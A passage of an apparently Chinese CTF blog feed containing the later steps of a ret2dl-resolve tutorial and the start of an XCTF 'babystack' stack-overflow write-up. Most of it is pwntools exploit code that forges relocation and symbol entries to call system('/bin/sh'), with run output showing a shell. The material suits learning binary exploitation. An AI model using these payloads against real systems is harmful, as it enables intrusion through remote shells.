punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span></code></pre><p>结果成功调用write函数打印/bin/sh</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49114Welcome to the Crazy World<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><h3 id="step3"><a href="#step3" class="headerlink" title="step3:"></a>step3:</h3><p>控制index_offset，指向我们构造的fake_reloc</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>rel_plt <span class="token operator">=</span> <span class="token number">0x8048324</span> <span class="token comment" spellcheck="true">#readelf -d test2</span>index_offset <span class="token operator">=</span> <span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">-</span> rel_plt <span class="token comment" spellcheck="true">#off+rel.plt_addr ==>  base_stage+28</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>r_info <span class="token operator">=</span> <span class="token number">0x607</span> <span class="token comment" spellcheck="true">#rel.plt of write --> r_info</span>fake_reloc <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> fake_relocpayload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：成功调用write函数并打印/bin/sh</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49177Welcome to the Crazy World<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive</code></pre><h3 id="step4："><a href="#step4：" class="headerlink" title="step4："></a>step4：</h3><p>再进一步：构造fake——sym，使其指向我们控制的st_name</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>rel_plt <span class="token operator">=</span> <span class="token number">0x8048324</span> <span class="token comment" spellcheck="true">#readelf -d test2</span>index_offset <span class="token operator">=</span> <span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">-</span> rel_plt <span class="token comment" spellcheck="true">#off+rel.plt_addr ==>  base_stage+28</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>dynsym <span class="token operator">=</span> <span class="token number">0x80481cc</span>dynstr <span class="token operator">=</span> <span class="token number">0x804826c</span>fake_sym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">36</span> <span class="token comment" spellcheck="true">#(fake_reloc takes 16 bytes)</span>这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是<span class="token number">0x10</span>字节大小align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for the balance</span>fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> align除以<span class="token number">0x10</span>因为Elf32_Sym结构体的大小为<span class="token number">0x10</span>，得到write的dynsym索引号index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span> r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>fake_reloc <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>st_name <span class="token operator">=</span> <span class="token number">0x4c</span> <span class="token comment" spellcheck="true">#在synstr中的偏移</span>fake_sym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> fake_reloc <span class="token comment" spellcheck="true">#(at the base_stage+28)</span>payload2 <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span>alignpayload2 <span class="token operator">+=</span> fake_sym <span class="token comment" spellcheck="true">#(base_stage+36)</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：再次成功</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49247Welcome to the Crazy World<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><h3 id="step5："><a href="#step5：" class="headerlink" title="step5："></a>step5：</h3><p>控制st_name指向字符串‘write’’</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>rel_plt <span class="token operator">=</span> <span class="token number">0x8048324</span> <span class="token comment" spellcheck="true">#readelf -d test2</span>index_offset <span class="token operator">=</span> <span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">-</span> rel_plt <span class="token comment" spellcheck="true">#off+rel.plt_addr ==>  base_stage+28</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>dynsym <span class="token operator">=</span> <span class="token number">0x80481cc</span>dynstr <span class="token operator">=</span> <span class="token number">0x804826c</span>fake_sym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">36</span> <span class="token comment" spellcheck="true">#(fake_reloc takes 16 bytes)</span>align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for the balance</span>fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> alignindex_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span> r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>fake_reloc <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>st_name <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">-</span> dynstr <span class="token comment" spellcheck="true">#this 0x10 for the sizeof fake_sym_addr</span>fake_sym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> fake_reloc <span class="token comment" spellcheck="true">#(at the base_stage+28)</span>payload2 <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span>alignpayload2 <span class="token operator">+=</span> fake_sym <span class="token comment" spellcheck="true">#(base_stage+36)</span>payload2 <span class="token operator">+=</span> <span class="token string">'write\x00'</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：成功调用并打印</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49302Welcome to the Crazy World<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><h3 id="step6"><a href="#step6" class="headerlink" title="step6:"></a>step6:</h3><p>替换write为system，并修改对应bss中的参数</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>rel_plt <span class="token operator">=</span> <span class="token number">0x8048324</span> <span class="token comment" spellcheck="true">#readelf -d test2</span>index_offset <span class="token operator">=</span> <span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">-</span> rel_plt <span class="token comment" spellcheck="true">#off+rel.plt_addr ==>  base_stage+28</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>dynsym <span class="token operator">=</span> <span class="token number">0x80481cc</span>dynstr <span class="token operator">=</span> <span class="token number">0x804826c</span>fake_sym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">36</span> <span class="token comment" spellcheck="true">#(fake_reloc takes 16 bytes)</span>align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for the balance</span>fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> alignindex_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span> r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>fake_reloc <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>st_name <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">-</span> dynstr <span class="token comment" spellcheck="true">#this 0x10 for the sizeof fake_sym_addr</span>fake_sym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> <span class="token string">'aaaa'</span>payload2 <span class="token operator">+=</span> <span class="token string">'aaaa'</span>payload2 <span class="token operator">+=</span> fake_reloc <span class="token comment" spellcheck="true">#(at the base_stage+28)</span>payload2 <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span>alignpayload2 <span class="token operator">+=</span> fake_sym <span class="token comment" spellcheck="true">#(base_stage+36)</span>payload2 <span class="token operator">+=</span> <span class="token string">'system\x00'</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：获得shell</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49341Welcome to the Crazy World<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode$ <span class="token function">whoami</span>hunter$  </code></pre><p>for more details ：<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-PWN100</title>
      <link href="/2020/07/21/xctf-challenge-pwn100/"/>
      <url>/2020/07/21/xctf-challenge-pwn100/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge/pwn100$ checksec babystack<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/pwn100/babystack'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>差点保护全开，有点狠</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-90h]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+98h] [rbp-8h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">sub_4008B9</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 输出菜单</span>    v3 <span class="token operator">=</span> <span class="token function">sub_400841</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">// 读取选项</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">256uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 存在溢出可能</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">sub_400826</span><span class="token punctuation">(</span><span class="token string">"invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sub_400826</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_400AE7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>用IDA观察后，整个程序没有system  binsh，也没有后门加上出题者给出了libc文件，没得说的这是ret2libc类型。</p><h2 id="3：执行情况"><a href="#3：执行情况" class="headerlink" title="3：执行情况"></a>3：执行情况</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge/pwn100$ ./babystack --------1.store2.print3.quit--------<span class="token operator">>></span> 1AAAAAAAAAAAAAA--------1.store2.print3.quit--------<span class="token operator">>></span> 2AAAAAAAAAAAAAA--------1.store2.print3.quit--------<span class="token operator">>></span> </code></pre><h2 id="4：思路"><a href="#4：思路" class="headerlink" title="4：思路"></a>4：思路</h2><ul><li>程序在读入时存在溢出，但有cookie的存在所以我们得先想办法泄露cookie。</li><li>cookie泄露很简单只要store ‘A’<em>(0x90-0x8) ，即sh.sendline( 